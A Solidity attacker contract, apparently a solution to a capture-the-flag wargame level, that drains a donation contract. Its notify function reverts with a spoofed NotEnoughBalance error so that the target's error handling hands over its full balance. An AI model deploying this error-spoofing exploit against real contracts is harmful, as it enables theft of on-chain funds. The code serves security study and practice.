// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

error NotEnoughBalance();

interface ICoin {
    function balances(address wallet) external returns (uint256 balance);
}

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
    function coin() external returns (ICoin coin);
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract GoodSamaritan is INotifyable {
    IGoodSamaritan goodSamaritanInstance;

    constructor(address _instanceAddress) {
        goodSamaritanInstance = IGoodSamaritan(_instanceAddress);
    }

    function attack() external {
        bool result = goodSamaritanInstance.requestDonation();
        require(!result, "Attack failed");
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    receive() external payable {}
}
